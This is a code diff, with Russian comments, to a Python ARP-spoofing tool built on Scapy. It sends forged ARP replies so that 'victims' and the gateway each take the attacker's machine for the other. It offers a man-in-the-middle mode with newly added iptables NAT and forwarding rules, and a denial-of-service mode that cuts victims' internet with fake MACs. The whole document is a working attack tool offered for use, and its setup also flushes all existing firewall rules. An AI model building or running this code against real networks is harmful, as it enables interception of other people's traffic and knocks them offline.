@@ -17,31 +17,77 @@ class ARPAttack:
         self.start_time = time.time()
         self.mitm_mode = False  # Новый флаг для режима MITM
         self.local_mac = None   # Будем получать позже
+        self.local_ip = None    # Добавляем для NAT
         
     def set_local_mac(self, mac):
         """Установить локальный MAC адрес"""
         self.local_mac = mac
         
+    def set_local_ip(self, ip):
+        """Установить локальный IP адрес"""
+        self.local_ip = ip
+        
+    def setup_forwarding(self):
+        """Настройка IP forwarding и NAT для MITM"""
+        try:
+            # Включаем IP forwarding
+            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], 
+                          capture_output=True, text=True)
+            
+            # Очищаем старые правила
+            subprocess.run(['iptables', '--flush'], capture_output=True)
+            subprocess.run(['iptables', '--table', 'nat', '--flush'], capture_output=True)
+            subprocess.run(['iptables', '--delete-chain'], capture_output=True)
+            subprocess.run(['iptables', '--table', 'nat', '--delete-chain'], capture_output=True)
+            
+            # Настройка NAT для исходящего трафика от жертв
+            subprocess.run([
+                'iptables', '-t', 'nat', '-A', 'POSTROUTING', 
+                '-o', self.interface, '-j', 'MASQUERADE'
+            ], capture_output=True)
+            
+            # Разрешаем форвардинг
+            subprocess.run([
+                'iptables', '-A', 'FORWARD', 
+                '-i', self.interface, '-j', 'ACCEPT'
+            ], capture_output=True)
+            
+            subprocess.run([
+                'iptables', '-A', 'FORWARD', 
+                '-o', self.interface, '-j', 'ACCEPT'
+            ], capture_output=True)
+            
+            print("\033[1;32m[✓] IP forwarding и NAT настроены\033[0m")
+            return True
+        except Exception as e:
+            print(f"\033[1;31m[!] Ошибка настройки forwarding: {str(e)}\033[0m")
+            return False
+            
+    def cleanup_forwarding(self):
+        """Очистка правил форвардинга"""
+        try:
+            # Выключаем IP forwarding
+            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], 
+                          capture_output=True, text=True)
+            
+            # Восстанавливаем стандартные правила
+            subprocess.run(['iptables', '--flush'], capture_output=True)
+            subprocess.run(['iptables', '-t', 'nat', '-F'], capture_output=True)
+            
+            print("\033[1;32m[✓] Правила форвардинга очищены\033[0m")
+        except:
+            pass
+    
     def set_mitm_mode(self, enable=True):
         """Включить/выключить MITM режим"""
         self.mitm_mode = enable
         if enable:
             print("\033[1;32m[⚡] Включен режим MITM - трафик пойдет через ваш компьютер\033[0m")
-            # Включаем IP forward для маршрутизации трафика
-            try:
-                subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], 
-                              capture_output=True, text=True)
-                print("\033[1;32m[✓] IP forward включен\033[0m")
-            except:
-                print("\033[1;33m[!] Не удалось включить IP forward\033[0m")
+            if not self.setup_forwarding():
+                print("\033[1;31m[!] Не удалось настроить форвардинг. MITM может не работать!\033[0m")
         else:
             print("\033[1;31m[☠] Включен режим DoS - интернет будет отключен\033[0m")
-            # Выключаем IP forward
-            try:
-                subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], 
-                              capture_output=True, text=True)
-            except:
-                pass
+            self.cleanup_forwarding()
     
     def add_victim(self, ip, mac):
         """Добавление жертвы"""
@@ -91,12 +137,12 @@ class ARPAttack:
                     else:
                         fake_mac = generate_fake_mac()  # Случайный MAC для DoS
                     
-                    # Создаем Ethernet + ARP пакет для жертвы
+                    # Пакет 1: Говорим жертве, что мы - шлюз
                     arp_packet = Ether(dst=victim['mac']) / ARP(
                         op=2,  # ARP reply
                         pdst=victim['ip'],
                         hwdst=victim['mac'],
-                        psrc=self.gateway_ip,
+                        psrc=self.gateway_ip,  # Притворяемся шлюзом
                         hwsrc=fake_mac
                     )
                     
@@ -104,14 +150,13 @@ class ARPAttack:
                     sendp(arp_packet, verbose=False, iface=self.interface)
                     self.packets_sent += 1
                     
-                    # В режиме MITM также отправляем пакет шлюзу
+                    # Пакет 2: Говорим шлюзу, что мы - жертва (только в MITM)
                     if self.mitm_mode and self.local_mac:
-                        # Пакет для шлюза, говорим что жертва - это мы
                         arp_to_gateway = Ether(dst=self.gateway_mac) / ARP(
                             op=2,
                             pdst=self.gateway_ip,
                             hwdst=self.gateway_mac,
-                            psrc=victim['ip'],
+                            psrc=victim['ip'],  # Притворяемся жертвой
                             hwsrc=self.local_mac
                         )
                         sendp(arp_to_gateway, verbose=False, iface=self.interface)
@@ -154,6 +199,7 @@ class ARPAttack:
             print(f"\033[1;33m[*] Восстанавливаю ARP-таблицу жертвы {victim['ip']}...\033[0m")
             
             for i in range(20):
+                # Восстанавливаем для жертвы правильный MAC шлюза
                 restore_packet = Ether(dst=victim['mac']) / ARP(
                     op=2,
                     pdst=victim['ip'],
@@ -161,32 +207,24 @@ class ARPAttack:
                     psrc=self.gateway_ip,
                     hwsrc=self.gateway_mac
                 )
-                # Используем sendp() для L2 пакетов
                 sendp(restore_packet, verbose=False, iface=self.interface)
                 
-                # В режиме MITM восстанавливаем также шлюз
-                if self.mitm_mode:
-                    restore_gateway = Ether(dst=self.gateway_mac) / ARP(
-                        op=2,
-                        pdst=self.gateway_ip,
-                        hwdst=self.gateway_mac,
-                        psrc=victim['ip'],
-                        hwsrc=victim['mac']
-                    )
-                    sendp(restore_gateway, verbose=False, iface=self.interface)
+                # Восстанавливаем для шлюза правильный MAC жертвы
+                restore_gateway = Ether(dst=self.gateway_mac) / ARP(
+                    op=2,
+                    pdst=self.gateway_ip,
+                    hwdst=self.gateway_mac,
+                    psrc=victim['ip'],
+                    hwsrc=victim['mac']
+                )
+                sendp(restore_gateway, verbose=False, iface=self.interface)
                 
                 time.sleep(0.05)
             
             print(f"\033[1;32m[✓] Жертва {victim['ip']} восстановлена\033[0m")
         
-        # Отключаем IP forward если был включен
-        if self.mitm_mode:
-            try:
-                subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], 
-                              capture_output=True, text=True)
-                print("\033[1;32m[✓] IP forward отключен\033[0m")
-            except:
-                pass
+        # Очищаем правила форвардинга
+        self.cleanup_forwarding()
         
         elapsed = int(time.time() - self.start_time)
         print(f"\n\033[1;32m[✓] Всего отправлено пакетов: {self.packets_sent}\033[0m")
